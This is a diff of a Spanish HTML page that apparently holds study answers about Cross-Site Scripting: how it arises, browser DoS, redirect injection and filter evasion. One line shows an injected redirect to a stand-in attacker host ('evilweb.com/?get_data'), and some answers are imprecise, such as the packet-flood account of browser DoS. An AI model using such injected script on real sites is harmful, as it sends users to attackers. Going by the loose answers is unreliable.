@@ -13,7 +13,7 @@
 
     <body>
         <h4>¿Cómo funciona la técnica de Cross-Site Scripting?</h4>
-        <p>El XSS para cuando el desarollador no ha desinfectado las entradas de texto (campos de busqueda por ejemplo) y el cliente tiene la posibilidad de injectar codigo JS con estes campos</p>
+        <p>El XSS sucede cuando el desarollador no ha desinfectado las entradas de texto (campos de busqueda por ejemplo) y el cliente tiene la posibilidad de injectar codigo JS con estes campos</p>
         <!-- Fin pregunta 1 -->
 
         <h4>¿Por qué decimos que JavaScript está de nuestro lado?</h4>
@@ -45,9 +45,8 @@
         <!-- Fin pregunta 6 -->
 
         <h4>¿Qué significa realizar un ataque DoS al navegador?</h4>
-        <pre>
-
-        </pre><!-- Fin pregunta 7 -->
+        <p>Enviar una multitud de paquetes al navegador para hacer que sube su latencia</p>
+        <!-- Fin pregunta 7 -->
 
         <h4>¿Cómo puede un atacante redireccionar a los usuarios hacia otro sitio con una inyección en JavaScript?</h4>
         <p>Con un ataque persistente <span style="background-color: #282a36; color: #f8f8f2; border-radius: 5px; padding: 0px 5px 0px 5px; font-weight: 500;">windows.location.href = "http://evilweb.com/?get_data";</span></p>
@@ -56,6 +55,7 @@
         <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">
             <h4>¿Cómo podemos saltar los filtros que encontramos en la web?</h4>
         </a>
+        <p>Cambiando los caracteres que pueden ser detectadas por el filtro pero el navegador sigue interpretándolos</p>
         <!-- Fin pregunta 9 -->
     </body>
 </html>
